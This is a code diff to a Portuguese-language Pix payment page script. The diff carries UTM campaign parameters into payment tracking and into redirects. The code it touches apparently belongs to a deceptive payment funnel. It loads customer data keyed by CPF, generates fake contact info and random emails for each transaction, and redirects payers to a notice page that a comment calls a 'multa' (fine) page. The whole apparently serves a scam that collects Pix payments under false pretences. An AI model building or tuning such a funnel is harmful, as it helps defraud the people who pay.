@@ -1,3 +1,25 @@
+// Helper functions to preserve UTM parameters
+function getUrlParams() {
+    const params = new URLSearchParams(window.location.search);
+    const paramObj = {};
+    for (const [key, value] of params) {
+        paramObj[key] = value;
+    }
+    return paramObj;
+}
+
+function buildUrlWithParams(baseUrl) {
+    const params = getUrlParams();
+    if (Object.keys(params).length === 0) {
+        return baseUrl;
+    }
+    const url = new URL(baseUrl, window.location.origin);
+    for (const [key, value] of Object.entries(params)) {
+        url.searchParams.set(key, value);
+    }
+    return url.toString();
+}
+
 // Get customer data from localStorage (saved when accessing via CPF slug)
 const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
 
@@ -262,9 +284,10 @@ async function openPixModal() {
     showLoadingModal();
     
     try {
-        // Get customer data and selected product from localStorage
+        // Get customer data, selected product, and URL params from localStorage
         const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
         const selectedProduct = JSON.parse(localStorage.getItem('selectedProduct') || '{"amount": 5748, "offerHash": "seguidores847293", "productHash": "seguidores847293", "productTitle": "Pacote de Seguidores"}');
+        const params = getUrlParams();
         
         // Generate fake contact info
         const email = generateRandomEmail(customerData.nome || 'cliente');
@@ -299,11 +322,11 @@ async function openPixModal() {
             transaction_origin: 'api',
             tracking: {
                 src: '',
-                utm_source: '',
-                utm_medium: '',
-                utm_campaign: '',
-                utm_term: '',
-                utm_content: ''
+                utm_source: params.utm_source || '',
+                utm_medium: params.utm_medium || '',
+                utm_campaign: params.utm_campaign || '',
+                utm_term: params.utm_term || '',
+                utm_content: params.utm_content || ''
             },
             postback_url: 'https://example.com/webhook'
         };
@@ -572,7 +595,7 @@ function startPaymentMonitoring(gatewayId) {
                 }
                 
                 // REDIRECIONAMENTO INSTANTÂNEO PARA MULTA.HTML
-                window.location.href = 'aviso.html';
+                window.location.href = buildUrlWithParams('aviso.html');
                 return;
                 
             } else if (transactionStatus === 'expired' || transactionStatus === 'canceled' || transactionStatus === 'failed') {
@@ -830,7 +853,7 @@ async function handlePaymentConfirmation(gatewayId, confirmed) {
                 closePixModal();
                 
                 // Redirect to aviso.html
-                window.location.href = 'aviso.html';
+                window.location.href = buildUrlWithParams('aviso.html');
             } else {
                 alert('Pagamento ainda não foi identificado. Aguarde alguns instantes e tente novamente.');
             }
